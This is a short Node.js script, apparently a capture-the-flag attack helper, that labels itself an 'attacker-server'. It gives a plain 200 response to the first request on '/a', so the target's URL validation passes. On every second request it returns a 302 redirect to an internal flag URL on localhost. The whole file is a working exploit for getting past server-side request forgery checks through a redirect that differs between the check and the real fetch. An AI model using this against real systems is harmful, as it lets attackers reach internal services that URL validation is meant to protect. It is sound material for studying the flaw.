const http = require('http');

const PORT     = parseInt(process.env.PORT || '8000', 10);
const FLAG_URL = process.env.FLAG_URL || 'http://[::1]:1337/flag';

const hits = {};
http.createServer((req, res) => {
  const path = req.url.split('?')[0];
  hits[path] = (hits[path] || 0) + 1;
  const n = hits[path];
  const stamp = new Date().toISOString().slice(11, 19);

  if (path === '/a' && n % 2 === 0) {
    console.log(`[${stamp}] ${path} hit#${n}  -> 302 REDIRECT ${FLAG_URL}   (diff fetch)`);
    res.writeHead(302, { Location: FLAG_URL });
    return res.end();
  }
  console.log(`[${stamp}] ${path} hit#${n}  -> 200 ok` + (path === '/a' ? '   (validation)' : ''));
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('ok\n');
}).listen(PORT, () => {
  console.log(`attacker-server listening on :${PORT}`);
  console.log(`redirect target = ${FLAG_URL}`);
});
